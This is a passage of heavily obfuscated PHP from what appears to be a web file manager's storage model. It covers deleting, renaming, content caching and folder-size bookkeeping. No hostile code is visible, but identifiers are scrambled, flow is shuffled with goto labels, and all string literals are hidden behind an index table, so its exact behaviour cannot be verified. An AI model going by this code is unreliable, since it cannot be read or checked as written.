$B‰‡ëÑê¸°[783]; goto fÀïÕˆ¨é¨; c¹¨ ¯´ö: } $Cç£°“Û = $this->sourceInfo($aÁ‘´„ÍôÛ); goto bÈÜÌ™Ì¯×; B —æ—‡Ñù: return !0; goto DÉ‡´íÌã§; bÈÜÌ™Ì¯×: $aŠí¦‡Æâ = $this->pathInfoMore($aÁ‘´„ÍôÛ); if (!$Cç£°“Û) { return !0; } if ($Cç£°“Û[$B‰‡ëÑê¸°[457]] == 0) { if (!$GLOBALS[$B‰‡ëÑê¸°[453]]) { return !1; } } goto cÅµí¨ŞÜâ; cÅµí¨ŞÜâ: $this->lockMoveStart($aÁ‘´„ÍôÛ); Hook::trigger($B‰‡ëÑê¸°[2241], $aŠí¦‡Æâ, $dè¼™Æåâ¢); if ($dè¼™Æåâ¢) { Model($B‰‡ëÑê¸°[2242])->moveToRecycle($aÁ‘´„ÍôÛ); } else { if ($Cç£°“Û[$B‰‡ëÑê¸°[367]] == $B‰‡ëÑê¸°[493]) { $B“¨èª…µ = array($B‰‡ëÑê¸°[518] => array($B‰‡ëÑê¸°[475], $Cç£°“Û[$B‰‡ëÑê¸°[455]] . $aÁ‘´„ÍôÛ . $B‰‡ëÑê¸°[476])); $eçÀ°ñœĞ = array($B‰‡ëÑê¸°[518] => $B“¨èª…µ[$B‰‡ëÑê¸°[455]]); $aÚÈ´™ÅÇÃ = $this->field($B‰‡ëÑê¸°[2243])->where($eçÀ°ñœĞ)->select(); $c³¨²±ÇÑÕ = !1; $C™æ¦©ñ… = array($aÁ‘´„ÍôÛ); if ($aÚÈ´™ÅÇÃ) { $c³¨²±ÇÑÕ = array_to_keyvalue($aÚÈ´™ÅÇÃ, $B‰‡ëÑê¸°[33], $B‰‡ëÑê¸°[415]); $c³¨²±ÇÑÕ = array_remove_value($c³¨²±ÇÑÕ, $B‰‡ëÑê¸°[464]); $C™æ¦©ñ… = array_to_keyvalue($aÚÈ´™ÅÇÃ, $B‰‡ëÑê¸°[33], $B‰‡ëÑê¸°[366]); $C™æ¦©ñ…[] = $aÁ‘´„ÍôÛ; } } else { $c³¨²±ÇÑÕ = array($Cç£°“Û[$B‰‡ëÑê¸°[415]]); $C™æ¦©ñ… = array($aÁ‘´„ÍôÛ); } Model($B‰‡ëÑê¸°[498])->eventRemove($aÁ‘´„ÍôÛ); $this->removeRelevance($C™æ¦©ñ…, $c³¨²±ÇÑÕ); } goto Dß…µ™¹„; D‚Â”éŒ¯: $this->updateModifyTime($A¬ó’ÃÚÁ); $this->lockMoveEnd($aÁ‘´„ÍôÛ); Hook::trigger($B‰‡ëÑê¸°[1384], $aŠí¦‡Æâ, $dè¼™Æåâ¢); goto B —æ—‡Ñù; Dß…µ™¹„: $this->folderSizeReset($Cç£°“Û[$B‰‡ëÑê¸°[457]]); $A¬ó’ÃÚÁ = array($Cç£°“Û[$B‰‡ëÑê¸°[457]]); if ($Cç£°“Û[$B‰‡ëÑê¸°[367]] == $B‰‡ëÑê¸°[493]) { $A¬ó’ÃÚÁ[] = $Cç£°“Û[$B‰‡ëÑê¸°[366]]; } goto D‚Â”éŒ¯; DÉ‡´íÌã§: } public function removeArray($FÒáìÏê‚Ô) { if (!$FÒáìÏê‚Ô) { return !0; } } public function removeRelevance($aÖõŒšŠö§, $CæîìÎÁ) { goto fÓôñ°ù¼ù; fÓôñ°ù¼ù: $c—”õŞ¤‘¶ =& $_SERVER[¿õñ]; $aÖõŒšŠö§ = array_unique(array_filter($aÖõŒšŠö§)); $CæîìÎÁ = array_unique(array_filter($CæîìÎÁ)); goto Dôô·Ììùí; Dôô·Ììùí: if (!$aÖõŒšŠö§) { return !1; } $Cç­òØà­µ = array($c—”õŞ¤‘¶[380] => array($c—”õŞ¤‘¶[381], $aÖõŒšŠö§)); Model($c—”õŞ¤‘¶[2242])->where($Cç­òØà­µ)->delete(); goto A²¬òÏø³¾; D‘ÅÓ»Ìí­: Model($c—”õŞ¤‘¶[1990])->removeBySource($aÖõŒšŠö§); Model($c—”õŞ¤‘¶[2232])->removeBySource($aÖõŒšŠö§); $this->where($Cç­òØà­µ)->delete(); goto C¹Åø‘ßÄè; C¹Åø‘ßÄè: Model($c—”õŞ¤‘¶[418])->remove($CæîìÎÁ); for ($eÎ·Ê°©ƒ¸ = 0; $eÎ·Ê°©ƒ¸ < count($aÖõŒšŠö§); $eÎ·Ê°©ƒ¸++) { $this->sourceCacheClear($aÖõŒšŠö§[$eÎ·Ê°©ƒ¸]); } goto CäÎŒòá ª; A²¬òÏø³¾: Model($c—”õŞ¤‘¶[409])->where($Cç­òØà­µ)->delete(); Model($c—”õŞ¤‘¶[2244])->where($Cç­òØà­µ)->delete(); Model($c—”õŞ¤‘¶[498])->where($Cç­òØà­µ)->delete(); goto D‘ÅÓ»Ìí­; CäÎŒòá ª: } public function rename($B¼ ’º°æ§, $bÔë¹˜–¿“) { goto cØºÆ‹çà©; Aáõ§šá¤: if (!$F’ªß¸­Ÿµ[$B»‹¯¼òšª[367]] == $B»‹¯¼òšª[493]) { $C‰“¦›šàè[$B»‹¯¼òšª[369]] = get_path_ext($bÔë¹˜–¿“); } Model($B»‹¯¼òšª[498])->eventRename($B¼ ’º°æ§, $F’ªß¸­Ÿµ[$B»‹¯¼òšª[28]], $bÔë¹˜–¿“); $this->sourceCacheClear($B¼ ’º°æ§); goto aŒÑˆË½»œ; aÉî¿½ŒêÈ: $DÇËƒáÀÒ» = $this->fileNameExist($F’ªß¸­Ÿµ[$B»‹¯¼òšª[457]], $bÔë¹˜–¿“); if ($DÇËƒáÀÒ») { return !1; } $C‰“¦›šàè = array($B»‹¯¼òšª[383] => $bÔë¹˜–¿“, $B»‹¯¼òšª[517] => USER_ID); goto Aáõ§šá¤; cØºÆ‹çà©: $B»‹¯¼òšª =& $_SERVER[¿õñ]; $F’ªß¸­Ÿµ = $this->sourceInfo($B¼ ’º°æ§); if (!$F’ªß¸­Ÿµ) { return !1; } goto aÉî¿½ŒêÈ; aŒÑˆË½»œ: $this->setNamePinyin($B¼ ’º°æ§, $C‰“¦›šàè[$B»‹¯¼òšª[28]], !1); $this->updateModifyTime($F’ªß¸­Ÿµ[$B»‹¯¼òšª[457]]); return $this->where(array($B»‹¯¼òšª[380] => $B¼ ’º°æ§))->data($C‰“¦›šàè)->save(); goto Cîåè×©Ş; Cîåè×©Ş: } public function setNamePinyin($dì¹‚¬Š„, $CÔ¥åÖ¬ğŠ, $bŒİÆòõ´± = true) { $aë°¿°â¥‚ =& $_SERVER[¿õñ]; $b¦Šœï†ê = Input::check($CÔ¥åÖ¬ğŠ, $aë°¿°â¥‚[520]); if ($bŒİÆòõ´± && !$b¦Šœï†ê) { return; } if (!$b¦Šœï†ê) { $this->metaSet($dì¹‚¬Š„, $aë°¿°â¥‚[412], null); $this->metaSet($dì¹‚¬Š„, $aë°¿°â¥‚[411], null); return; } $eº‰ÆµìîŞ = array($aë°¿°â¥‚[412] => str_replace($aë°¿°â¥‚[50], $aë°¿°â¥‚[33], Pinyin::encode($CÔ¥åÖ¬ğŠ)), $aë°¿°â¥‚[411] => Pinyin::encode($CÔ¥åÖ¬ğŠ, $aë°¿°â¥‚[521])); $this->metaSet($dì¹‚¬Š„, $eº‰ÆµìîŞ); } public function getContent($b˜®öÀ‘Š) { goto cšÄ‘Ù¾Í; bŸ”ñø½ÉŸ: if ($D»õÇ¯Ş¿[$cÎ‡öÖŸ“¢[78]] == 0) { return $cÎ‡öÖŸ“¢[33]; } $E´á…¦“Õ = $cÎ‡öÖŸ“¢[2245] . $D»õÇ¯Ş¿[$cÎ‡öÖŸ“¢[160]]; if ($D»õÇ¯Ş¿[$cÎ‡öÖŸ“¢[78]] <= 1024 * 10) { $BÉ®ÎÍ¼‡ë = Cache::get($E´á…¦“Õ); if (!$BÉ®ÎÍ¼‡ë) { $BÉ®ÎÍ¼‡ë = IO::getContent($D»õÇ¯Ş¿[$cÎ‡öÖŸ“¢[76]]); Cache::set($E´á…¦“Õ, $BÉ®ÎÍ¼‡ë); } return $BÉ®ÎÍ¼‡ë; } goto eê‹ÈÔ»±; cšÄ‘Ù¾Í: $cÎ‡öÖŸ“¢ =& $_SERVER[¿õñ]; $D»õÇ¯Ş¿ = $this->fileInfoGet($b˜®öÀ‘Š); if (!$D»õÇ¯Ş¿) { return !1; } goto bŸ”ñø½ÉŸ; eê‹ÈÔ»±: return IO::getContent($D»õÇ¯Ş¿[$cÎ‡öÖŸ“¢[76]]); goto C‚›ÁÑ­ÖØ; C‚›ÁÑ­ÖØ: } public function setDesc($EÃµ² ²Ğ, $fíŞ¥æ÷ãª) { $dŸÒõÍºİŸ =& $_SERVER[¿õñ]; Model($dŸÒõÍºİŸ[498])->eventAddDesc($EÃµ² ²Ğ, $fíŞ¥æ÷ãª); return $this->metaSet($EÃµ² ²Ğ, $dŸÒõÍºİŸ[401], $fíŞ¥æ÷ãª); } public function setContent($Föàè“ÊØ§, $CàØµ™ìğó = '') { goto BÇÇğ¾ÎÕ¶; C¶ƒµÎƒÌ: if (!$bÎ¥Œù·°º || !$fÏÏğ£«¡) { return !1; } $this->checkLock($Föàè“ÊØ§); $fù¦‹“³äØ = Model($BŠ¼ÔèÒÚø[418])->addFileByContent($CàØµ™ìğó, $fÏÏğ£«¡[$BŠ¼ÔèÒÚø[28]]); goto B±ˆ÷Ùê†Æ; BÇÇğ¾ÎÕ¶: $BŠ¼ÔèÒÚø =& $_SERVER[¿õñ]; $fÏÏğ£«¡ = $this->sourceInfo($Föàè“ÊØ§); $bÎ¥Œù·°º = $this->fileInfoGet($Föàè“ÊØ§); goto C¶ƒµÎƒÌ; B±ˆ÷Ùê†Æ: $A¥‹´„œ³Û = $this->fileHistory($fÏÏğ£«¡, $fù¦‹“³äØ[$BŠ¼ÔèÒÚø[415]], $fù¦‹“³äØ[$BŠ¼ÔèÒÚø[78]]); if (!$A¥‹´„œ³Û) { return Model($BŠ¼ÔèÒÚø[418])->remove($fù¦‹“³äØ[$BŠ¼ÔèÒÚø[415]]); } $this->folderSizeReset($fÏÏğ£«¡[$BŠ¼ÔèÒÚø[457]]); goto b³ §ÎØÅÙ; b³ §ÎØÅÙ: return !0; goto BŒõÛ’“¼”; BŒõÛ’“¼”: } public function fileSubstr($f‡¦Ø£ÁÑ, $AÒç—ÍŒÈÕ, $D³ æãŒÄ÷) { $dÖŠ¾„£ = $this->fileInfoGet($f‡¦Ø£ÁÑ); if (!$dÖŠ¾„£) { return !1; } return IO::fileSubstr($dÖŠ¾„£[$_SERVER[¿õñ][76]], $AÒç—ÍŒÈÕ, $D³ æãŒÄ÷); } public function fileInfoGet($BªèŞ¾àÂ½) { goto FÃÔëÙ™ë; b¡êñïÇ³Š: return $BÂ·ìİ„¿; goto D÷‚ô÷¿”ğ; f‘î‚£®Ó©: $BÂ·ìİ„¿ = Model($CèÈÜ¤æ”“[418])->fileInfo($fÔ™ÈÈ‡£¹[$CèÈÜ¤æ”“[415]]); if ($BÂ·ìİ„¿) { $BÂ·ìİ„¿[$CèÈÜ¤æ”“[28]] = $fÔ™ÈÈ‡£¹[$CèÈÜ¤æ”“[28]]; } self::$cacheFileInfo[$DìÅÑ·Úé] = $BÂ·ìİ„¿; goto b¡êñïÇ³Š; FÃÔëÙ™ë: $CèÈÜ¤æ”“ =& $_SERVER[¿õñ]; $fÔ™ÈÈ‡£¹ = $this->sourceInfo($BªèŞ¾àÂ½); if (!$fÔ™ÈÈ‡£¹ || $fÔ™ÈÈ‡£¹[$CèÈÜ¤æ”“[367]]) { return !1; } goto Cí£„½çÎÀ; Cí£„½çÎÀ: $DìÅÑ·Úé = $CèÈÜ¤æ”“[421] . $fÔ™ÈÈ‡£¹[$CèÈÜ¤æ”“[415]]; $añæÛ•Çò… = _get(self::$cacheFileInfo, $DìÅÑ·Úé); if ($añæÛ•Çò…) { return $añæÛ•Çò…; } goto f‘î‚£®Ó©; D÷‚ô÷¿”ğ: } private function folderChildrenNumber($f£±³ßÓŸ„) { $FåÔÄ„Ê‡ =& $_SERVER[¿õñ]; $b¢¸ù‘øŞ™ = $this->sourceInfo($f£±³ßÓŸ„); $cáß‚šèïË = array($FåÔÄ„Ê‡[518] => array($FåÔÄ„Ê‡[475], $b¢¸ù‘øŞ™[$FåÔÄ„Ê‡[455]] . $f£±³ßÓŸ„ . $FåÔÄ„Ê‡[476]), $FåÔÄ„Ê‡[392] => 0, $FåÔÄ„Ê‡[511] => 1); $AÖãëÇµÇÇ = $this->where($cáß‚šèïË)->count(); $Fô­½Õ¹®é = $this->where($cáß‚šèïË)->where(array($FåÔÄ„Ê‡[511] => 0))->count(); return array($FåÔÄ„Ê‡[82] => $Fô­½Õ¹®é, $FåÔÄ„Ê‡[83] => $AÖãëÇµÇÇ); } public function pathInfo($FÔ„ÁÜÃ³µ, $DÏæßõ¸œå = false) { goto cµâÙ¦À“Ğ; D–…¯¨Û¿™: $cœÍä¬ãÉ” = $this->_listDataApplyItem($cœÍä¬ãÉ”, $DÏæßõ¸œå); self::$cachePathInfo[$eÁ¡³ àÃè] = $cœÍä¬ãÉ”; return $cœÍä¬ãÉ”; goto d§½àË£ø; cµâÙ¦À“Ğ: $E–Ãµ¥‹ =& $_SERVER[¿õñ]; $eÁ¡³ àÃè = $E–Ãµ¥‹[407] . intval($DÏæßõ¸œå) . $E–Ãµ¥‹[408] . $FÔ„ÁÜÃ³µ; $FîÅÓî™‚ = _get(self::$cachePathInfo, $eÁ¡³ àÃè); goto c—ˆ¸¸»çŠ; c—ˆ¸¸»çŠ: if ($FîÅÓî™‚) { return $FîÅÓî™‚; } $cœÍä¬ãÉ” = $this->sourceInfo($FÔ„ÁÜÃ³µ); if (!$cœÍä¬ãÉ”) { return !1; } goto D–…¯¨Û¿™; d§½àË£ø: } public static $cachePathInfoMore = array(); public function pathInfoMore($CÌÙ»³³÷•) { goto Fáëà±Ò©Ä; F™à‰‚†¯: self::$cachePathInfoMore[$CÌÙ»³³÷•] = $EÎÑ‚Éôº; return $EÎÑ‚Éôº; goto eñŒ£´®íØ; FÔ‚®¤õÕ‘: $EÎÑ‚Éôº = $this->pathInfo($CÌÙ»³³÷•); if (!$EÎÑ‚Éôº) { return !1; } if ($EÎÑ‚Éôº[$FÏõ´ÚÑ¡[367]] == $FÏõ´ÚÑ¡[493]) { $EÎÑ‚Éôº[$FÏõ´ÚÑ¡[81]] = $this->folderChildrenNumber($CÌÙ»³³÷•); } goto F™à‰‚†¯; Fáëà±Ò©Ä: $FÏõ´ÚÑ¡ =& $_SERVER[¿õñ]; $E¤…´×Õ³ì = _get(self::$cachePathInfoMore, $CÌÙ»³³÷•); if ($E¤…´×Õ³ì) { return $E¤…´×Õ³ì; } goto FÔ‚®¤õÕ‘; eñŒ£´®íØ: } public function sourceInfo($CæåøáÈ•) { $eºã»„Ó¶ö =& $_SERVER[¿õñ]; $cäˆ¤ê˜› = $eºã»„Ó¶ö[406] . $CæåøáÈ•; $A´‘¯¤¸¸ = _get(self::$cacheSourceInfo, $cäˆ¤ê˜›); if ($A´‘¯¤¸¸) { return $A´‘¯¤¸¸; } self::$cacheSourceInfo[$cäˆ¤ê˜›] = $this->where(array($eºã»„Ó¶ö[366] => $CæåøáÈ•))->find(); return self::$cacheSourceInfo[$cäˆ¤ê˜›]; } public function sourceCacheClear($FÕßÂ’ã…Â = false) { if ($FÕßÂ’ã…Â == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¿õñ][406] . $FÕßÂ’ã…Â]); } public function pathInfoByPath($aóÙ¡ƒ»‚, $fØ×„”½Ä) { $fáùÈÅ¤¦Š =& $_SERVER[¿õñ]; $fê§Ÿ÷Ö© = !$fØ×„”½Ä ? array() : explode($fáùÈÅ¤¦Š[8], trim($fØ×„”½Ä, $fáùÈÅ¤¦Š[8])); $e‚»ø‘¨á = $aóÙ¡ƒ»‚; foreach ($fê§Ÿ÷Ö© as $CÎÏæÖ½±) { $d§ö½«‹Á¤ = array($fáùÈÅ¤¦Š[457] => $e‚»ø‘¨á, $fáùÈÅ¤¦Š[28] => $CÎÏæÖ½±); $Bé˜è‚õóŠ = $this->where($d§ö½«‹Á¤)->select(); if (!$Bé˜è‚õóŠ) { return !1; } $Bé˜è‚õóŠ = array_sort_by($Bé˜è‚õóŠ, $fáùÈÅ¤¦Š[393]); $e‚»ø‘¨á = $Bé˜è‚õóŠ[0][$fáùÈÅ¤¦Š[366]]; } return $this->pathInfo($e‚»ø‘¨á, !0); } protected function updateModifyTime($fØÍ¹Ö„‰ø) { goto AØ¤›Ş§ğÇ; DÊ¦»†îÊ: foreach ($fØÍ¹Ö„‰ø as $c¯÷âÚ©¶ => $F ¾¼ŠÛ) { $fØÍ¹Ö„‰ø[$c¯÷âÚ©¶] = intval($F ¾¼ŠÛ); } $C‚ˆï•‚‰ª = array($Dï¤Ã’İ‘[366] => array($Dï¤Ã’İ‘[7], $fØÍ¹Ö„‰ø)); $e‰¸ê¤ˆÆ = array($Dï¤Ã’İ‘[517] => USER_ID, $Dï¤Ã’İ‘[387] => time()); goto f¢ƒò‚µ; f¢ƒò‚µ: $this->where($C‚ˆï•‚‰ª)->save($e‰¸ê¤ˆÆ); goto e§¸«àê”; AØ¤›Ş§ğÇ: $Dï¤Ã’İ‘ =& $_SERVER[¿õñ]; if (!$fØÍ¹Ö„‰ø) { return; } if (!is_array($fØÍ¹Ö„‰ø)) { $fØÍ¹Ö„‰ø = array($fØÍ¹Ö„‰ø); } goto DÊ¦»†îÊ; e§¸«àê”: } public function folderSizeReset($A†‰·¯µÎ¡) { goto b³‰ËÖ±à×; A¿³¶‡Èƒï: $dƒ›¾Œñ‰£ = array($bÔŸ¡¹‡Ô§[365] => $A†‰·¯µÎ¡, $bÔŸ¡¹‡Ô§[392] => 0); $eÀ°åù¼Â = $this->where($dƒ›¾Œñ‰£)->sum($bÔŸ¡¹‡Ô§[78]); $eÀ°åù¼Â = intval($eÀ°åù¼Â); goto CëæÅÒ¦Éç; Aº°ÛÙ¤â„: CacheLock::unlock($DÌƒÙÏ¥ˆ„); goto eì®Æ‰¯ß¾; b³‰ËÖ±à×: $bÔŸ¡¹‡Ô§ =& $_SERVER[¿õñ]; if ($this->statusIgnoreResetSpace) { return; } $DÌƒÙÏ¥ˆ„ = $bÔŸ¡¹‡Ô§[2246] . $A†‰·¯µÎ¡; goto fÚ¯Ô‡ğ£‚; fÚ¯Ô‡ğ£‚: CacheLock::lock($DÌƒÙÏ¥ˆ„, 20); $this->sourceCacheClear($A†‰·¯µÎ¡); $DøĞİÇµÎ = $this->sourceInfo($A†‰·¯µÎ¡); goto A¿³¶‡Èƒï; Dù‚¡¡ò™Ö: $DƒÙÃÒÀ¯ = $this->parentLevelArray($DøĞİÇµÎ[$bÔŸ¡¹‡Ô§[455]]); if ($DƒÙÃÒÀ¯) { $dƒ›¾Œñ‰£ = array($bÔŸ¡¹‡Ô§[366] => array($bÔŸ¡¹‡Ô§[381], $DƒÙÃÒÀ¯)); $this->where($dƒ›¾Œñ‰£)->setAdd($bÔŸ¡¹‡Ô§[78], $fê°¢ğ”†Ö); } $this->targetSpaceUpdate($DøĞİÇµÎ[$bÔŸ¡¹‡Ô§[368]], $DøĞİÇµÎ[$bÔŸ¡¹‡Ô§[452]]); goto Aº°ÛÙ¤â„; CëæÅÒ¦Éç: $fê°¢ğ”†Ö = $eÀ°åù¼Â - intval($DøĞİÇµÎ[$bÔŸ¡¹‡Ô§[78]]); if ($fê°¢ğ”†Ö == 0) { return CacheLock::unlock($DÌƒÙÏ¥ˆ„); } $this->where(array($bÔŸ¡¹‡Ô§[380] => $A†‰·¯µÎ¡))->setField($bÔŸ¡¹‡Ô§[78], $eÀ°åù¼Â); goto Dù‚¡¡ò™Ö; eì®Æ‰¯ß¾: } public function folderSizeResetChildren($DçÏâ‘¡áØ) { goto BİÉª‚È¬; E…ôŠ¬×ÜÏ: foreach ($D²ë±Íêê as $dâÂ•ˆÀ®÷) { if ($dâÂ•ˆÀ®÷[$fÖ…“½[78]] == $dâÂ•ˆÀ®÷[$fÖ…“½[2248]]) { continue; } $Fåì‡·ã¾[] = array($fÖ…“½[366], $dâÂ•ˆÀ®÷[$fÖ…“½[366]], $fÖ…“½[78], $dâÂ•ˆÀ®÷[$fÖ…“½[78]]); } $this->saveAll($Fåì‡·ã¾); goto e¼óİÊ„¹„; dŠˆºéí÷Í: $D²ë±Íêê[] = $dËÑğÍå‘ã; $D²ë±Íêê = array_to_keyvalue($D²ë±Íêê, $fÖ…“½[366]); foreach ($D²ë±Íêê as $aŸÃ¨’²äå => $dâÂ•ˆÀ®÷) { $D²ë±Íêê[$aŸÃ¨’²äå][$fÖ…“½[2248]] = $D²ë±Íêê[$aŸÃ¨’²äå][$fÖ…“½[78]]; $D²ë±Íêê[$aŸÃ¨’²äå][$fÖ…“½[78]] = 0; } goto eêø·„Íèë; BĞ—ØñÀ: $bÔô„ª‘ëø = array($fÖ…“½[511] => 1, $fÖ…“½[518] => array($fÖ…“½[475], $dËÑğÍå‘ã[$fÖ…“½[455]] . $DçÏâ‘¡áØ . $fÖ…“½[476])); $B´¨¸Ú²ù = $fÖ…“½[2247]; $D²ë±Íêê = $this->field($B´¨¸Ú²ù)->where($bÔô„ª‘ëø)->select(); goto A˜èãˆ‡Äª; A˜èãˆ‡Äª: $bÔô„ª‘ëø[$fÖ…“½[367]] = 0; $D©ÙŸš®‰ğ = $this->field($B´¨¸Ú²ù)->where($bÔô„ª‘ëø)->select(); if (!$D©ÙŸš®‰ğ) { return; } goto dŠˆºéí÷Í; BİÉª‚È¬: $fÖ…“½ =& $_SERVER[¿õñ]; $this->sourceCacheClear($DçÏâ‘¡áØ); $dËÑğÍå‘ã = $this->sourceInfo($DçÏâ‘¡áØ); goto BĞ—ØñÀ; eêø·„Íèë: foreach ($D©ÙŸš®‰ğ as $dâÂ•ˆÀ®÷) { $eàÓ¤íÏ‹ = $dâÂ•ˆÀ®÷[$fÖ…“½[457]] . $fÖ…“½[33]; if (!isset($D²ë±Íêê[$eàÓ¤íÏ‹])) { continue; } if ($dâÂ•ˆÀ®÷[$fÖ…“½[393]] == $D²ë±Íêê[$eàÓ¤íÏ‹][$fÖ…“½[393]]) { $D²ë±Íêê[$eàÓ¤íÏ‹][$fÖ…“½[78]] += $dâÂ•ˆÀ®÷[$fÖ…“½[78]]; } } foreach ($D²ë±Íêê as $dâÂ•ˆÀ®÷) { $eƒÈê¾œ„† = $this->parentLevelArray($dâÂ•ˆÀ®÷[$fÖ…“½[455]]); foreach ($eƒÈê¾œ„† as $eàÓ¤íÏ‹) { $eàÓ¤íÏ‹ = $eàÓ¤íÏ‹ . $fÖ…“½[33]; if (!isset($D²ë±Íêê[$eàÓ¤íÏ‹])) { continue; } if ($dâÂ•ˆÀ®÷[$fÖ…“½[393]] == $D²ë±Íêê[$eàÓ¤íÏ‹][$fÖ…“½[393]]) { $D²ë±Íêê[$eàÓ¤íÏ‹][$fÖ…“½[78]] += $dâÂ•ˆÀ®÷[$fÖ…“½[78]]; } } } $Fåì‡·ã¾ = array(); goto E…ôŠ¬×ÜÏ; e¼óİÊ„¹„: } public function userSpaceReset($F´è¼ÊÁà‘ = false) { $D‰¶—Õ¥Î¸ =& $_SERVER[¿õñ]; $EÅ™·£ğè = $this->where(array($D‰¶—Õ¥Î¸[368] => self::TYPE_USER, $D‰¶—Õ¥Î¸[452] => $F´è¼ÊÁà‘, $D‰¶—Õ¥Î¸[367] => 0))->sum($D‰¶—Õ¥Î¸[78]); Model($D‰¶—Õ¥Î¸[466])->userEdit($F´è¼ÊÁà‘, array($D‰¶—Õ¥Î¸[1999] => $EÅ™·£ğè)); } public function targetSpaceUpdate($E ¡Ú¨à÷‚, $eÃ‡‡Ë¾ï´) { $c™ºš¥ê¸´ =& $_SERVER[¿õñ]; if (!$eÃ‡‡Ë¾ï´) { return; } if (!in_array($E ¡Ú¨à÷‚, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $FæÒÜ«À³ = $this->targetSpaceSize($E ¡Ú¨à÷‚, $eÃ‡‡Ë¾ï´); if ($E ¡Ú¨à÷‚ == self::TYPE_USER) { Model($c™ºš¥ê¸´[466])->userEdit($eÃ‡‡Ë¾ï´, array($c™ºš¥ê¸´[1999] => $FæÒÜ«À³)); } else { if ($E ¡Ú¨à÷‚ == self::TYPE_GROUP) { Model($c™ºš¥ê¸´[454])->groupEdit($eÃ‡‡Ë¾ï´, array($c™ºš¥ê¸´[1999] => $FæÒÜ«À³)); } } } public function targetSpaceSize($böÁ¤ö˜Ğ·, $c“Õ§¶Èí) { goto cï…¢®œñ®; B”¯îì»í£: $FÁö„‚ÇØ× = floatval($bÜ©ø¢›[$bĞÚä£Î”ç[78]]); $E‘×Ü¤‚Òº = array($bĞÚä£Î”ç[518] => array($bĞÚä£Î”ç[475], $bĞÚä£Î”ç[2085] . $bÜ©ø¢›[$bĞÚä£Î”ç[366]] . $bĞÚä£Î”ç[476])); $e¸ŸÙ¼Éß = Model($bĞÚä£Î”ç[391])->field($bĞÚä£Î”ç[380])->where($E‘×Ü¤‚Òº)->select(); goto c¯Û½Ë¸š»; fæ“²¥õÆ: return $FÁö„‚ÇØ×; goto dã‚ÉˆÎ¤æ; c¯Û½Ë¸š»: $e¸ŸÙ¼Éß = array_to_keyvalue($e¸ŸÙ¼Éß, $bĞÚä£Î”ç[33], $bĞÚä£Î”ç[366]); $e¸ŸÙ¼Éß = array_unique(array_filter($e¸ŸÙ¼Éß)); if ($e¸ŸÙ¼Éß) { $E‘×Ü¤‚Òº = array($bĞÚä£Î”ç[380] => array($bĞÚä£Î”ç[381], $e¸ŸÙ¼Éß)); $FÁö„‚ÇØ× += floatval($this->where($E‘×Ü¤‚Òº)->sum($bĞÚä£Î”ç[78])); } goto fæ“²¥õÆ; cï…¢®œñ®: $bĞÚä£Î”ç =& $_SERVER[¿õñ]; $bÜ©ø¢› = $this->sourceRoot($böÁ¤ö˜Ğ·, $c“Õ§¶Èí, !0); if (!$bÜ©ø¢›) { return 0; } goto B”¯îì»í£; dã‚ÉˆÎ¤æ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b…Úñ„»¡“) { return $this->fileTypeProfile($b…Úñ„»¡“, SourceModel::TYPE_USER); } public function groupFileTypeProfile($b†—‘ãÊÇ…) { return $this->fileTypeProfile($b†—‘ãÊÇ…, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C†è¾åœˆî, $e­ñ™ˆ±Â‰) { goto CÙ²®ò©à…; f¥è±ğÙ½¦: foreach ($a‘½´Üç ° as $fìì‚È¢’“ => $C·¶‘†Óµ–) { $cİ¹­ë³ğ[$F†—ÃœÇœ[369]] = $this->fileTypeWhere($fìì‚È¢’“); $f­¼ÄÅ™ãí[$fìì‚È¢’“] = array($F†—ÃœÇœ[2251] => $C·¶‘†Óµ–[$F†—ÃœÇœ[28]], $F†—ÃœÇœ[2252] => $this->where($cİ¹­ë³ğ)->count(), $F†—ÃœÇœ[513] => $this->where($cİ¹­ë³ğ)->sum($F†—ÃœÇœ[78])); } Cache::set($cº·ê¢îé, $f­¼ÄÅ™ãí, 1200); return $f­¼ÄÅ™ãí; goto a°ÕÛÑïÜÅ; AÔ§¡œïŠ¥: $f­¼ÄÅ™ãí = array(); $f­¼ÄÅ™ãí[$F†—ÃœÇœ[2250]] = array($F†—ÃœÇœ[2251] => LNG($F†—ÃœÇœ[2250]), $F†—ÃœÇœ[2252] => $this->where($cİ¹­ë³ğ)->count(), $F†—ÃœÇœ[513] => $this->where($cİ¹­ë³ğ)->sum($F†—ÃœÇœ[78])); $a‘½´Üç ° = KodIO::fileTypeList(); goto f¥è±ğÙ½¦; CÙ²®ò©à…: $F†—ÃœÇœ =& $_SERVER[¿õñ]; $cº·ê¢îé = $F†—ÃœÇœ[2249] . $C†è¾åœˆî . $F†—ÃœÇœ[71] . $e­ñ™ˆ±Â‰; $D¥¢Áç¹Šâ = Cache::get($cº·ê¢îé); goto A©íÌ¤‰šŠ; A©íÌ¤‰šŠ: if ($D¥¢Áç¹Šâ) { return $D¥¢Áç¹Šâ; } $cİ¹­ë³ğ = array($F†—ÃœÇœ[511] => 0); if ($C†è¾åœˆî != !1) { $cİ¹­ë³ğ[$F†—ÃœÇœ[452]] = $C†è¾åœˆî; $cİ¹­ë³ğ[$F†—ÃœÇœ[368]] = $e­ñ™ˆ±Â‰; } goto AÔ§¡œïŠ¥; a°ÕÛÑïÜÅ: } public function fileNameExist($BÄ¨å ¯—, $C¯ÎÜÓßÏò) { $CÆŒ’Šø à =& $_SERVER[¿õñ]; $eİİä³¢‡ = $this->childList($BÄ¨å ¯—); foreach ($eİİä³¢‡ as $A¡ÏÌÛ®®ò) { if ($A¡ÏÌÛ®®ò[$CÆŒ’Šø à[28]] == $C¯ÎÜÓßÏò) { return $A¡ÏÌÛ®®ò[$CÆŒ’Šø à[366]]; } } return !1; } public function childList($eÖÁÂ¥Î± ) { $DÕî¥À¾‡à =& $_SERVER[¿õñ]; $Fß§†¡éØˆ = array($DÕî¥À¾‡à[457] => intval($eÖÁÂ¥Î± ), $DÕî¥À¾‡à[393] => 0); $e ‰Ÿ©Œ¾¤ = $this->cacheMemory()->where($Fß§†¡éØˆ)->select(); $e ‰Ÿ©Œ¾¤ = $e ‰Ÿ©Œ¾¤ ? $e ‰Ÿ©Œ¾¤ : array(); foreach ($e ‰Ÿ©Œ¾¤ as $c´çî§Ñœ²) { $A§„Ë¿áÁ = $DÕî¥À¾‡à[406] . $c´çî§Ñœ²[$DÕî¥À¾‡à[366]]; self::$cacheSourceInfo[$A§„Ë¿áÁ] = $c´çî§Ñœ²; } return 